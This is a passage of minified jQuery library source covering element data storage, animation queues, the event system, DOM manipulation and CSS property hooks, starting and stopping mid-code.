                    if (void 0 !== i) return "object" == (void 0 === i ? "undefined" : Vt(i)) ? this.each(function() {
                        K.set(this, i)
                    }) : R(this, function(e) {
                        var t;
                        if (s && void 0 === e) {
                            if (void 0 !== (t = K.get(s, i))) return t;
                            if (void 0 !== (t = Z(s, i))) return t
                        } else this.each(function() {
                            K.set(this, i, e)
                        })
                    }, null, e, 1 < arguments.length, null, !0);
                    if (this.length && (o = K.get(s), 1 === s.nodeType && !V.get(s, "hasDataAttrs"))) {
                        for (t = r.length; t--;) r[t] && 0 === (n = r[t].name).indexOf("data-") && (n = U(n.slice(5)), Z(s, n, o[n]));
                        V.set(s, "hasDataAttrs", !0)
                    }
                    return o
                },
                removeData: function(e) {
                    return this.each(function() {
                        K.remove(this, e)
                    })
                }
            }), C.extend({
                queue: function(e, t, i) {
                    var n;
                    if (e) return t = (t || "fx") + "queue", n = V.get(e, t), i && (!n || Array.isArray(i) ? n = V.access(e, t, C.makeArray(i)) : n.push(i)), n || []
                },
                dequeue: function(e, t) {
                    t = t || "fx";
                    var i = C.queue(e, t),
                        n = i.length,
                        o = i.shift(),
                        s = C._queueHooks(e, t);
                    "inprogress" === o && (o = i.shift(), n--), o && ("fx" === t && i.unshift("inprogress"), delete s.stop, o.call(e, function() {
                        C.dequeue(e, t)
                    }, s)), !n && s && s.empty.fire()
                },
                _queueHooks: function(e, t) {
                    var i = t + "queueHooks";
                    return V.get(e, i) || V.access(e, i, {
                        empty: C.Callbacks("once memory").add(function() {
                            V.remove(e, [t + "queue", i])
                        })
                    })
                }
            }), C.fn.extend({
                queue: function(t, i) {
                    var e = 2;
                    return "string" != typeof t && (i = t, t = "fx", e--), arguments.length < e ? C.queue(this[0], t) : void 0 === i ? this : this.each(function() {
                        var e = C.queue(this, t, i);
                        C._queueHooks(this, t), "fx" === t && "inprogress" !== e[0] && C.dequeue(this, t)
                    })
                },
                dequeue: function(e) {
                    return this.each(function() {
                        C.dequeue(this, e)
                    })
                },
                clearQueue: function(e) {
                    return this.queue(e || "fx", [])
                },
                promise: function(e, t) {
                    var i, n = 1,
                        o = C.Deferred(),
                        s = this,
                        r = this.length,
                        a = function() {
                            --n || o.resolveWith(s, [s])
                        };
                    for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; r--;)(i = V.get(s[r], e + "queueHooks")) && i.empty && (n++, i.empty.add(a));
                    return a(), o.promise(t)
                }
            });
            var ee = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
                te = new RegExp("^(?:([+-])=|)(" + ee + ")([a-z%]*)$", "i"),
                ie = ["Top", "Right", "Bottom", "Left"],
                ne = function(e, t) {
                    return "none" === (e = t || e).style.display || "" === e.style.display && C.contains(e.ownerDocument, e) && "none" === C.css(e, "display")
                },
                oe = function(e, t, i, n) {
                    var o, s, r = {};
                    for (s in t) r[s] = e.style[s], e.style[s] = t[s];
                    for (s in o = i.apply(e, n || []), t) e.style[s] = r[s];
                    return o
                };

            function se(e, t, i, n) {
                var o, s, r = 20,
                    a = n ? function() {
                        return n.cur()
                    } : function() {
                        return C.css(e, t, "")
                    },
                    l = a(),
                    d = i && i[3] || (C.cssNumber[t] ? "" : "px"),
                    c = (C.cssNumber[t] || "px" !== d && +l) && te.exec(C.css(e, t));
                if (c && c[3] !== d) {
                    for (l /= 2, d = d || c[3], c = +l || 1; r--;) C.style(e, t, c + d), (1 - s) * (1 - (s = a() / l || .5)) <= 0 && (r = 0), c /= s;
                    c *= 2, C.style(e, t, c + d), i = i || []
                }
                return i && (c = +c || +l || 0, o = i[1] ? c + (i[1] + 1) * i[2] : +i[2], n && (n.unit = d, n.start = c, n.end = o)), o
            }
            var re = {};

            function ae(e, t) {
                for (var i, n, o = [], s = 0, r = e.length; s < r; s++)(n = e[s]).style && (i = n.style.display, t ? ("none" === i && (o[s] = V.get(n, "display") || null, o[s] || (n.style.display = "")), "" === n.style.display && ne(n) && (o[s] = (u = d = l = void 0, d = (a = n).ownerDocument, c = a.nodeName, (u = re[c]) || (l = d.body.appendChild(d.createElement(c)), u = C.css(l, "display"), l.parentNode.removeChild(l), "none" === u && (u = "block"), re[c] = u)))) : "none" !== i && (o[s] = "none", V.set(n, "display", i)));
                var a, l, d, c, u;
                for (s = 0; s < r; s++) null != o[s] && (e[s].style.display = o[s]);
                return e
            }
            C.fn.extend({
                show: function() {
                    return ae(this, !0)
                },
                hide: function() {
                    return ae(this)
                },
                toggle: function(e) {
                    return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function() {
                        ne(this) ? C(this).show() : C(this).hide()
                    })
                }
            });
            var le = /^(?:checkbox|radio)$/i,
                de = /<([a-z][^\/\0>\x20\t\r\n\f]+)/i,
                ce = /^$|^module$|\/(?:java|ecma)script/i,
                ue = {
                    option: [1, "<select multiple='multiple'>", "</select>"],
                    thead: [1, "<table>", "</table>"],
                    col: [2, "<table><colgroup>", "</colgroup></table>"],
                    tr: [2, "<table><tbody>", "</tbody></table>"],
                    td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
                    _default: [0, "", ""]
                };

            function pe(e, t) {
                var i;
                return i = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : [], void 0 === t || t && A(e, t) ? C.merge([e], i) : i
            }

            function fe(e, t) {
                for (var i = 0, n = e.length; i < n; i++) V.set(e[i], "globalEval", !t || V.get(t[i], "globalEval"))
            }
            ue.optgroup = ue.option, ue.tbody = ue.tfoot = ue.colgroup = ue.caption = ue.thead, ue.th = ue.td;
            var he, ve, ge = /<|&#?\w+;/;

            function me(e, t, i, n, o) {
                for (var s, r, a, l, d, c, u = t.createDocumentFragment(), p = [], f = 0, h = e.length; f < h; f++)
                    if ((s = e[f]) || 0 === s)
                        if ("object" === x(s)) C.merge(p, s.nodeType ? [s] : s);
                        else if (ge.test(s)) {
                    for (r = r || u.appendChild(t.createElement("div")), a = (de.exec(s) || ["", ""])[1].toLowerCase(), l = ue[a] || ue._default, r.innerHTML = l[1] + C.htmlPrefilter(s) + l[2], c = l[0]; c--;) r = r.lastChild;
                    C.merge(p, r.childNodes), (r = u.firstChild).textContent = ""
                } else p.push(t.createTextNode(s));
                for (u.textContent = "", f = 0; s = p[f++];)
                    if (n && -1 < C.inArray(s, n)) o && o.push(s);
                    else if (d = C.contains(s.ownerDocument, s), r = pe(u.appendChild(s), "script"), d && fe(r), i)
                    for (c = 0; s = r[c++];) ce.test(s.type || "") && i.push(s);
                return u
            }
            he = T.createDocumentFragment().appendChild(T.createElement("div")), (ve = T.createElement("input")).setAttribute("type", "radio"), ve.setAttribute("checked", "checked"), ve.setAttribute("name", "t"), he.appendChild(ve), m.checkClone = he.cloneNode(!0).cloneNode(!0).lastChild.checked, he.innerHTML = "<textarea>x</textarea>", m.noCloneChecked = !!he.cloneNode(!0).lastChild.defaultValue;
            var ye = T.documentElement,
                be = /^key/,
                we = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
                xe = /^([^.]*)(?:\.(.+)|)/;

            function ke() {
                return !0
            }

            function Se() {
                return !1
            }

            function Te() {
                try {
                    return T.activeElement
                } catch (e) {}
            }

            function Ce(e, t, i, n, o, s) {
                var r, a;
                if ("object" == (void 0 === t ? "undefined" : Vt(t))) {
                    for (a in "string" != typeof i && (n = n || i, i = void 0), t) Ce(e, a, i, n, t[a], s);
                    return e
                }
                if (null == n && null == o ? (o = i, n = i = void 0) : null == o && ("string" == typeof i ? (o = n, n = void 0) : (o = n, n = i, i = void 0)), !1 === o) o = Se;
                else if (!o) return e;
                return 1 === s && (r = o, (o = function(e) {
                    return C().off(e), r.apply(this, arguments)
                }).guid = r.guid || (r.guid = C.guid++)), e.each(function() {
                    C.event.add(this, t, o, n, i)
                })
            }
            C.event = {
                global: {},
                add: function(t, e, i, n, o) {
                    var s, r, a, l, d, c, u, p, f, h, v, g = V.get(t);
                    if (g)
                        for (i.handler && (i = (s = i).handler, o = s.selector), o && C.find.matchesSelector(ye, o), i.guid || (i.guid = C.guid++), (l = g.events) || (l = g.events = {}), (r = g.handle) || (r = g.handle = function(e) {
                                return void 0 !== C && C.event.triggered !== e.type ? C.event.dispatch.apply(t, arguments) : void 0
                            }), d = (e = (e || "").match(N) || [""]).length; d--;) f = v = (a = xe.exec(e[d]) || [])[1], h = (a[2] || "").split(".").sort(), f && (u = C.event.special[f] || {}, f = (o ? u.delegateType : u.bindType) || f, u = C.event.special[f] || {}, c = C.extend({
                            type: f,
                            origType: v,
                            data: n,
                            handler: i,
                            guid: i.guid,
                            selector: o,
                            needsContext: o && C.expr.match.needsContext.test(o),
                            namespace: h.join(".")
                        }, s), (p = l[f]) || ((p = l[f] = []).delegateCount = 0, u.setup && !1 !== u.setup.call(t, n, h, r) || t.addEventListener && t.addEventListener(f, r)), u.add && (u.add.call(t, c), c.handler.guid || (c.handler.guid = i.guid)), o ? p.splice(p.delegateCount++, 0, c) : p.push(c), C.event.global[f] = !0)
                },
                remove: function(e, t, i, n, o) {
                    var s, r, a, l, d, c, u, p, f, h, v, g = V.hasData(e) && V.get(e);
                    if (g && (l = g.events)) {
                        for (d = (t = (t || "").match(N) || [""]).length; d--;)
                            if (f = v = (a = xe.exec(t[d]) || [])[1], h = (a[2] || "").split(".").sort(), f) {
                                for (u = C.event.special[f] || {}, p = l[f = (n ? u.delegateType : u.bindType) || f] || [], a = a[2] && new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), r = s = p.length; s--;) c = p[s], !o && v !== c.origType || i && i.guid !== c.guid || a && !a.test(c.namespace) || n && n !== c.selector && ("**" !== n || !c.selector) || (p.splice(s, 1), c.selector && p.delegateCount--, u.remove && u.remove.call(e, c));
                                r && !p.length && (u.teardown && !1 !== u.teardown.call(e, h, g.handle) || C.removeEvent(e, f, g.handle), delete l[f])
                            } else
                                for (f in l) C.event.remove(e, f + t[d], i, n, !0);
                        C.isEmptyObject(l) && V.remove(e, "handle events")
                    }
                },
                dispatch: function(e) {
                    var t, i, n, o, s, r, a = C.event.fix(e),
                        l = new Array(arguments.length),
                        d = (V.get(this, "events") || {})[a.type] || [],
                        c = C.event.special[a.type] || {};
                    for (l[0] = a, t = 1; t < arguments.length; t++) l[t] = arguments[t];
                    if (a.delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, a)) {
                        for (r = C.event.handlers.call(this, a, d), t = 0;
                            (o = r[t++]) && !a.isPropagationStopped();)
                            for (a.currentTarget = o.elem, i = 0;
                                (s = o.handlers[i++]) && !a.isImmediatePropagationStopped();) a.rnamespace && !a.rnamespace.test(s.namespace) || (a.handleObj = s, a.data = s.data, void 0 !== (n = ((C.event.special[s.origType] || {}).handle || s.handler).apply(o.elem, l)) && !1 === (a.result = n) && (a.preventDefault(), a.stopPropagation()));
                        return c.postDispatch && c.postDispatch.call(this, a), a.result
                    }
                },
                handlers: function(e, t) {
                    var i, n, o, s, r, a = [],
                        l = t.delegateCount,
                        d = e.target;
                    if (l && d.nodeType && !("click" === e.type && 1 <= e.button))
                        for (; d !== this; d = d.parentNode || this)
                            if (1 === d.nodeType && ("click" !== e.type || !0 !== d.disabled)) {
                                for (s = [], r = {}, i = 0; i < l; i++) void 0 === r[o = (n = t[i]).selector + " "] && (r[o] = n.needsContext ? -1 < C(o, this).index(d) : C.find(o, this, null, [d]).length), r[o] && s.push(n);
                                s.length && a.push({
                                    elem: d,
                                    handlers: s
                                })
                            }
                    return d = this, l < t.length && a.push({
                        elem: d,
                        handlers: t.slice(l)
                    }), a
                },
                addProp: function(t, e) {
                    Object.defineProperty(C.Event.prototype, t, {
                        enumerable: !0,
                        configurable: !0,
                        get: y(e) ? function() {
                            if (this.originalEvent) return e(this.originalEvent)
                        } : function() {
                            if (this.originalEvent) return this.originalEvent[t]
                        },
                        set: function(e) {
                            Object.defineProperty(this, t, {
                                enumerable: !0,
                                configurable: !0,
                                writable: !0,
                                value: e
                            })
                        }
                    })
                },
                fix: function(e) {
                    return e[C.expando] ? e : new C.Event(e)
                },
                special: {
                    load: {
                        noBubble: !0
                    },
                    focus: {
                        trigger: function() {
                            if (this !== Te() && this.focus) return this.focus(), !1
                        },
                        delegateType: "focusin"
                    },
                    blur: {
                        trigger: function() {
                            if (this === Te() && this.blur) return this.blur(), !1
                        },
                        delegateType: "focusout"
                    },
                    click: {
                        trigger: function() {
                            if ("checkbox" === this.type && this.click && A(this, "input")) return this.click(), !1
                        },
                        _default: function(e) {
                            return A(e.target, "a")
                        }
                    },
                    beforeunload: {
                        postDispatch: function(e) {
                            void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result)
                        }
                    }
                }
            }, C.removeEvent = function(e, t, i) {
                e.removeEventListener && e.removeEventListener(t, i)
            }, C.Event = function(e, t) {
                if (!(this instanceof C.Event)) return new C.Event(e, t);
                e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? ke : Se, this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target, this.currentTarget = e.currentTarget, this.relatedTarget = e.relatedTarget) : this.type = e, t && C.extend(this, t), this.timeStamp = e && e.timeStamp || Date.now(), this[C.expando] = !0
            }, C.Event.prototype = {
                constructor: C.Event,
                isDefaultPrevented: Se,
                isPropagationStopped: Se,
                isImmediatePropagationStopped: Se,
                isSimulated: !1,
                preventDefault: function() {
                    var e = this.originalEvent;
                    this.isDefaultPrevented = ke, e && !this.isSimulated && e.preventDefault()
                },
                stopPropagation: function() {
                    var e = this.originalEvent;
                    this.isPropagationStopped = ke, e && !this.isSimulated && e.stopPropagation()
                },
                stopImmediatePropagation: function() {
                    var e = this.originalEvent;
                    this.isImmediatePropagationStopped = ke, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation()
                }
            }, C.each({
                altKey: !0,
                bubbles: !0,
                cancelable: !0,
                changedTouches: !0,
                ctrlKey: !0,
                detail: !0,
                eventPhase: !0,
                metaKey: !0,
                pageX: !0,
                pageY: !0,
                shiftKey: !0,
                view: !0,
                char: !0,
                charCode: !0,
                key: !0,
                keyCode: !0,
                button: !0,
                buttons: !0,
                clientX: !0,
                clientY: !0,
                offsetX: !0,
                offsetY: !0,
                pointerId: !0,
                pointerType: !0,
                screenX: !0,
                screenY: !0,
                targetTouches: !0,
                toElement: !0,
                touches: !0,
                which: function(e) {
                    var t = e.button;
                    return null == e.which && be.test(e.type) ? null != e.charCode ? e.charCode : e.keyCode : !e.which && void 0 !== t && we.test(e.type) ? 1 & t ? 1 : 2 & t ? 3 : 4 & t ? 2 : 0 : e.which
                }
            }, C.event.addProp), C.each({
                mouseenter: "mouseover",
                mouseleave: "mouseout",
                pointerenter: "pointerover",
                pointerleave: "pointerout"
            }, function(e, o) {
                C.event.special[e] = {
                    delegateType: o,
                    bindType: o,
                    handle: function(e) {
                        var t, i = e.relatedTarget,
                            n = e.handleObj;
                        return i && (i === this || C.contains(this, i)) || (e.type = n.origType, t = n.handler.apply(this, arguments), e.type = o), t
                    }
                }
            }), C.fn.extend({
                on: function(e, t, i, n) {
                    return Ce(this, e, t, i, n)
                },
                one: function(e, t, i, n) {
                    return Ce(this, e, t, i, n, 1)
                },
                off: function(e, t, i) {
                    var n, o;
                    if (e && e.preventDefault && e.handleObj) return n = e.handleObj, C(e.delegateTarget).off(n.namespace ? n.origType + "." + n.namespace : n.origType, n.selector, n.handler), this;
                    if ("object" != (void 0 === e ? "undefined" : Vt(e))) return !1 !== t && "function" != typeof t || (i = t, t = void 0), !1 === i && (i = Se), this.each(function() {
                        C.event.remove(this, e, i, t)
                    });
                    for (o in e) this.off(o, t, e[o]);
                    return this
                }
            });
            var $e = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,
                Ae = /<script|<style|<link/i,
                je = /checked\s*(?:[^=]|=\s*.checked.)/i,
                Ee = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;

            function Me(e, t) {
                return A(e, "table") && A(11 !== t.nodeType ? t : t.firstChild, "tr") && C(e).children("tbody")[0] || e
            }

            function Pe(e) {
                return e.type = (null !== e.getAttribute("type")) + "/" + e.type, e
            }

            function De(e) {
                return "true/" === (e.type || "").slice(0, 5) ? e.type = e.type.slice(5) : e.removeAttribute("type"), e
            }

            function qe(e, t) {
                var i, n, o, s, r, a, l, d;
                if (1 === t.nodeType) {
                    if (V.hasData(e) && (s = V.access(e), r = V.set(t, s), d = s.events))
                        for (o in delete r.handle, r.events = {}, d)
                            for (i = 0, n = d[o].length; i < n; i++) C.event.add(t, o, d[o][i]);
                    K.hasData(e) && (a = K.access(e), l = C.extend({}, a), K.set(t, l))
                }
            }

            function He(i, n, o, s) {
                n = v.apply([], n);
                var e, t, r, a, l, d, c = 0,
                    u = i.length,
                    p = u - 1,
                    f = n[0],
                    h = y(f);
                if (h || 1 < u && "string" == typeof f && !m.checkClone && je.test(f)) return i.each(function(e) {
                    var t = i.eq(e);
                    h && (n[0] = f.call(this, e, t.html())), He(t, n, o, s)
                });
                if (u && (t = (e = me(n, i[0].ownerDocument, !1, i, s)).firstChild, 1 === e.childNodes.length && (e = t), t || s)) {
                    for (a = (r = C.map(pe(e, "script"), Pe)).length; c < u; c++) l = e, c !== p && (l = C.clone(l, !0, !0), a && C.merge(r, pe(l, "script"))), o.call(i[c], l, c);
                    if (a)
                        for (d = r[r.length - 1].ownerDocument, C.map(r, De), c = 0; c < a; c++) l = r[c], ce.test(l.type || "") && !V.access(l, "globalEval") && C.contains(d, l) && (l.src && "module" !== (l.type || "").toLowerCase() ? C._evalUrl && C._evalUrl(l.src) : w(l.textContent.replace(Ee, ""), d, l))
                }
                return i
            }

            function Ne(e, t, i) {
                for (var n, o = t ? C.filter(t, e) : e, s = 0; null != (n = o[s]); s++) i || 1 !== n.nodeType || C.cleanData(pe(n)), n.parentNode && (i && C.contains(n.ownerDocument, n) && fe(pe(n, "script")), n.parentNode.removeChild(n));
                return e
            }
            C.extend({
                htmlPrefilter: function(e) {
                    return e.replace($e, "<$1></$2>")
                },
                clone: function(e, t, i) {
                    var n, o, s, r, a, l, d, c = e.cloneNode(!0),
                        u = C.contains(e.ownerDocument, e);
                    if (!(m.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || C.isXMLDoc(e)))
                        for (r = pe(c), n = 0, o = (s = pe(e)).length; n < o; n++) a = s[n], l = r[n], void 0, "input" === (d = l.nodeName.toLowerCase()) && le.test(a.type) ? l.checked = a.checked : "input" !== d && "textarea" !== d || (l.defaultValue = a.defaultValue);
                    if (t)
                        if (i)
                            for (s = s || pe(e), r = r || pe(c), n = 0, o = s.length; n < o; n++) qe(s[n], r[n]);
                        else qe(e, c);
                    return 0 < (r = pe(c, "script")).length && fe(r, !u && pe(e, "script")), c
                },
                cleanData: function(e) {
                    for (var t, i, n, o = C.event.special, s = 0; void 0 !== (i = e[s]); s++)
                        if (G(i)) {
                            if (t = i[V.expando]) {
                                if (t.events)
                                    for (n in t.events) o[n] ? C.event.remove(i, n) : C.removeEvent(i, n, t.handle);
                                i[V.expando] = void 0
                            }
                            i[K.expando] && (i[K.expando] = void 0)
                        }
                }
            }), C.fn.extend({
                detach: function(e) {
                    return Ne(this, e, !0)
                },
                remove: function(e) {
                    return Ne(this, e)
                },
                text: function(e) {
                    return R(this, function(e) {
                        return void 0 === e ? C.text(this) : this.empty().each(function() {
                            1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e)
                        })
                    }, null, e, arguments.length)
                },
                append: function() {
                    return He(this, arguments, function(e) {
                        1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || Me(this, e).appendChild(e)
                    })
                },
                prepend: function() {
                    return He(this, arguments, function(e) {
                        if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                            var t = Me(this, e);
                            t.insertBefore(e, t.firstChild)
                        }
                    })
                },
                before: function() {
                    return He(this, arguments, function(e) {
                        this.parentNode && this.parentNode.insertBefore(e, this)
                    })
                },
                after: function() {
                    return He(this, arguments, function(e) {
                        this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
                    })
                },
                empty: function() {
                    for (var e, t = 0; null != (e = this[t]); t++) 1 === e.nodeType && (C.cleanData(pe(e, !1)), e.textContent = "");
                    return this
                },
                clone: function(e, t) {
                    return e = null != e && e, t = null == t ? e : t, this.map(function() {
                        return C.clone(this, e, t)
                    })
                },
                html: function(e) {
                    return R(this, function(e) {
                        var t = this[0] || {},
                            i = 0,
                            n = this.length;
                        if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
                        if ("string" == typeof e && !Ae.test(e) && !ue[(de.exec(e) || ["", ""])[1].toLowerCase()]) {
                            e = C.htmlPrefilter(e);
                            try {
                                for (; i < n; i++) 1 === (t = this[i] || {}).nodeType && (C.cleanData(pe(t, !1)), t.innerHTML = e);
                                t = 0
                            } catch (e) {}
                        }
                        t && this.empty().append(e)
                    }, null, e, arguments.length)
                },
                replaceWith: function() {
                    var i = [];
                    return He(this, arguments, function(e) {
                        var t = this.parentNode;
                        C.inArray(this, i) < 0 && (C.cleanData(pe(this)), t && t.replaceChild(e, this))
                    }, i)
                }
            }), C.each({
                appendTo: "append",
                prependTo: "prepend",
                insertBefore: "before",
                insertAfter: "after",
                replaceAll: "replaceWith"
            }, function(e, r) {
                C.fn[e] = function(e) {
                    for (var t, i = [], n = C(e), o = n.length - 1, s = 0; s <= o; s++) t = s === o ? this : this.clone(!0), C(n[s])[r](t), l.apply(i, t.get());
                    return this.pushStack(i)
                }
            });
            var Oe = new RegExp("^(" + ee + ")(?!px)[a-z%]+$", "i"),
                Le = function(e) {
                    var t = e.ownerDocument.defaultView;
                    return t && t.opener || (t = S), t.getComputedStyle(e)
                },
                _e = new RegExp(ie.join("|"), "i");

            function Ie(e, t, i) {
                var n, o, s, r, a = e.style;
                return (i = i || Le(e)) && ("" !== (r = i.getPropertyValue(t) || i[t]) || C.contains(e.ownerDocument, e) || (r = C.style(e, t)), !m.pixelBoxStyles() && Oe.test(r) && _e.test(t) && (n = a.width, o = a.minWidth, s = a.maxWidth, a.minWidth = a.maxWidth = a.width = r, r = i.width, a.width = n, a.minWidth = o, a.maxWidth = s)), void 0 !== r ? r + "" : r
            }

            function We(e, t) {
                return {
                    get: function() {
                        if (!e()) return (this.get = t).apply(this, arguments);
                        delete this.get
                    }
                }
            }! function() {
                function e() {
                    if (l) {
                        a.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", l.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", ye.appendChild(a).appendChild(l);
                        var e = S.getComputedStyle(l);
                        i = "1%" !== e.top, r = 12 === t(e.marginLeft), l.style.right = "60%", s = 36 === t(e.right), n = 36 === t(e.width), l.style.position = "absolute", o = 36 === l.offsetWidth || "absolute", ye.removeChild(a), l = null
                    }
                }

                function t(e) {
                    return Math.round(parseFloat(e))
                }
                var i, n, o, s, r, a = T.createElement("div"),
                    l = T.createElement("div");
                l.style && (l.style.backgroundClip = "content-box", l.cloneNode(!0).style.backgroundClip = "", m.clearCloneStyle = "content-box" === l.style.backgroundClip, C.extend(m, {
                    boxSizingReliable: function() {
                        return e(), n
                    },
                    pixelBoxStyles: function() {
                        return e(), s
                    },
                    pixelPosition: function() {
                        return e(), i
                    },
                    reliableMarginLeft: function() {
                        return e(), r
                    },
                    scrollboxSize: function() {
                        return e(), o
                    }
                }))
            }();
            var ze = /^(none|table(?!-c[ea]).+)/,
                Re = /^--/,
                Fe = {
                    position: "absolute",
                    visibility: "hidden",
                    display: "block"
                },
                Be = {
                    letterSpacing: "0",
                    fontWeight: "400"
                },
                Xe = ["Webkit", "Moz", "ms"],
                Ue = T.createElement("div").style;

            function Ge(e) {
                var t = C.cssProps[e];
                return t || (t = C.cssProps[e] = function(e) {
                    if (e in Ue) return e;
                    for (var t = e[0].toUpperCase() + e.slice(1), i = Xe.length; i--;)
                        if ((e = Xe[i] + t) in Ue) return e
                }(e) || e), t
            }

            function Ye(e, t, i) {
                var n = te.exec(t);
                return n ? Math.max(0, n[2] - (i || 0)) + (n[3] || "px") : t
            }

            function Ve(e, t, i, n, o, s) {
                var r = "width" === t ? 1 : 0,
                    a = 0,
                    l = 0;
                if (i === (n ? "border" : "content")) return 0;
                for (; r < 4; r += 2) "margin" === i && (l += C.css(e, i + ie[r], !0, o)), n ? ("content" === i && (l -= C.css(e, "padding" + ie[r], !0, o)), "margin" !== i && (l -= C.css(e, "border" + ie[r] + "Width", !0, o))) : (l += C.css(e, "padding" + ie[r], !0, o), "padding" !== i ? l += C.css(e, "border" + ie[r] + "Width", !0, o) : a += C.css(e, "border" + ie[r] + "Width", !0, o));
                return !n && 0 <= s && (l += Math.max(0, Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - s - l - a - .5))), l
            }

            function Ke(e, t, i) {
                var n = Le(e),
                    o = Ie(e, t, n),
                    s = "border-box" === C.css(e, "boxSizing", !1, n),
                    r = s;
                if (Oe.test(o)) {
                    if (!i) return o;
                    o = "auto"
                }
                return r = r && (m.boxSizingReliable() || o === e.style[t]), ("auto" === o || !parseFloat(o) && "inline" === C.css(e, "display", !1, n)) && (o = e["offset" + t[0].toUpperCase() + t.slice(1)], r = !0), (o = parseFloat(o) || 0) + Ve(e, t, i || (s ? "border" : "content"), r, n, o) + "px"
            }

            function Qe(e, t, i, n, o) {
                return new Qe.prototype.init(e, t, i, n, o)
            }
            C.extend({
                cssHooks: {
                    opacity: {
                        get: function(e, t) {
                            if (t) {
                                var i = Ie(e, "opacity");
                                return "" === i ? "1" : i
                            }
                        }
                    }
                },
                cssNumber: {
                    animationIterationCount: !0,
                    columnCount: !0,
                    fillOpacity: !0,
                    flexGrow: !0,
                    flexShrink: !0,
                    fontWeight: !0,
                    lineHeight: !0,
                    opacity: !0,
                    order: !0,
                    orphans: !0,
                    widows: !0,
                    zIndex: !0,
                    zoom: !0
                },
                cssProps: {},
                style: function(e, t, i, n) {
                    if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                        var o, s, r, a = U(t),
                            l = Re.test(t),
                            d = e.style;
                        if (l || (t = Ge(a)), r = C.cssHooks[t] || C.cssHooks[a], void 0 === i) return r && "get" in r && void 0 !== (o = r.get(e, !1, n)) ? o : d[t];
                        "string" == (s = void 0 === i ? "undefined" : Vt(i)) && (o = te.exec(i)) && o[1] && (i = se(e, t, o), s = "number"), null != i && i == i && ("number" === s && (i += o && o[3] || (C.cssNumber[a] ? "" : "px")), m.clearCloneStyle || "" !== i || 0 !== t.indexOf("background") || (d[t] = "inherit"), r && "set" in r && void 0 === (i = r.set(e, i, n)) || (l ? d.setProperty(t, i) : d[t] = i))
                    }
                },
                css: function(e, t, i, n) {
                    var o, s, r, a = U(t);
                    return Re.test(t) || (t = Ge(a)), (r = C.cssHooks[t] || C.cssHooks[a]) && "get" in r && (o = r.get(e, !0, i)), void 0 === o && (o = Ie(e, t, n)), "normal" === o && t in Be && (o = Be[t]), "" === i || i ? (s = parseFloat(o), !0 === i || isFinite(s) ? s || 0 : o) : o
                }
            }), C.each(["height", "width"], function(e, a) {
                C.cssHooks[a] = {
                    get: function(e, t, i) {
                        if (t) return !ze.test(C.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? Ke(e, a, i) : oe(e, Fe, function() {
                            return Ke(e, a, i)
                        })
                    },
                    set: function(e, t, i) {
                        var n, o = Le(e),
                            s = "border-box" === C.css(e, "boxSizing", !1, o),
                            r = i && Ve(e, a, i, s, o);
                        return s && m.scrollboxSize() === o.position && (r -= Math.ceil(e["offset" + a[0].toUpperCase() + a.slice(1)] - parseFloat(o[a]) - Ve(e, a, "border", !1, o) - .5)), r && (n = te.exec(t)) && "px" !== (n[3] || "px") && (e.style[a] = t, t = C.css(e, a)), Ye(0, t, r)
                    }
                }
            }), C.cssHooks.marginLeft = We(m.reliableMarginLeft, function(e, t) {
                if (t) return (parseFloat(Ie(e, "marginLeft")) || e.getBoundingClientRect().left - oe(e, {
                    marginLeft: 0
                }, function() {
                    return e.getBoundingClientRect().left
                })) + "px"
            }), C.each({
                margin: "",
                padding: "",
                border: "Width"
            }, function(o, s) {
                C.cssHooks[o + s] = {
                    expand: function(e) {
                        for (var t = 0, i = {}, n = "string" == typeof e ? e.split(" ") : [e]; t < 4; t++) i[o + ie[t] + s] = n[t] || n[t - 2] || n[0];
                        return i
                    }
                }, "margin" !== o && (C.cssHooks[o + s].set = Ye)
            }), C.fn.extend({
                css: function(e, t) {
                    return R(this, function(e, t, i) {
                        var n, o, s = {},
                            r = 0;
                        if (Array.isArray(t)) {
                            for (n = Le(e), o = t.length; r < o; r++) s[t[r]] = C.css(e, t[r], !1, n);
                            return s
                        }
                        return void 0 !== i ? C.style(e, t, i) : C.css(e, t)
                    }, e, t, 1 < arguments.length)
                }
            }), ((C.Tween = Qe).prototype = {
                constructor: Qe,
                init: function(e, t, i, n, o, s) {
                    this.elem = e, this.prop = i, this.easing = o || C.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = n, this.unit = s || (C.cssNumber[i] ? "" : "px")
                },
                cur: function() {
                    var e = Qe.propHooks[this.prop];
                    return e && e.get ? e.get(this) : Qe.propHooks._default.get(this)
                },
                run: function(e) {
                    var t, i = Qe.propHooks[this.prop];
